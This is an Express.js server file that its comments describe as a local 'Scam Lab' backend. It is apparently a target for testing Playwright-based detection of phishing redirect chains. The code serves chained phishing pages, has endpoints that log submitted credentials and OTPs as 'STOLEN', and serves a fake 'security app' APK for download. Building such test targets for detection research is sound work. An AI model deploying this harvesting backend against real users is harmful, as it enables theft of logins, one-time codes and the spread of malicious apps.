// this is scammer end server which will store the user data 
// when the user will fill the form, it will exfiltrate (exit or leak) data secretly to the scammer side server
// Playwright will detect ki kis raaste se user data konse IP address aur URL pe redirect ho rha hai, if the data bounces through multiple URLs (REDIRECT CHAINS) => playwright will detect that chain and analyzes what user data is being leaked.


const express = require('express');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'pages')));

// Root Route
app.get('/', (req, res) => res.redirect('/1_redirect.html'));

// POST Exfiltration Point 1: Credentials
app.post('/api/harvest-login', (req, res) => {
    console.log('🚨 STOLEN CREDENTIALS:', req.body);
    res.redirect('/3_otp.html');
});

// POST Exfiltration Point 2: OTP
app.post('/api/harvest-otp', (req, res) => {
    console.log('🚨 STOLEN OTP:', req.body.otp);
    res.redirect('/4_success.html');
});

// Malware Download Endpoint
app.get('/download-security-app', (req, res) => {
    res.download(path.join(__dirname, 'pages', '5_fake.apk'));
});

app.listen(PORT, () => {
    console.log(`🚀 Scam Lab Live: http://localhost:3000`);
});